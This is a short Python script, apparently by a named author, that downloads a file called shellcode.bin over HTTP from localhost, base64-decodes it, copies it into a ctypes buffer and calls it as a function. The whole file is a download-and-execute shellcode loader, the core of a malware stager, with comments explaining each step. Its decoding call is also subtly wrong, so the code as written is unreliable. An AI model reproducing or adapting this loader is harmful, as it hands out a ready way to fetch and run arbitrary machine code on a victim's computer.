#!/usr/bin/env python
"""

@author : 'Muhammad Arslan <rslnrkmt2552@gmail.com>'

"""

import requests
import ctypes
import base64

url = "http://localhost/shellcode.bin"
response = requests.get(url)

shellcode = base64.decode(response.content)

# create a buffer in memory
shellcode_buff = ctypes.create_string_buffer(shellcode, len(shellcode))

# create function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buff, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()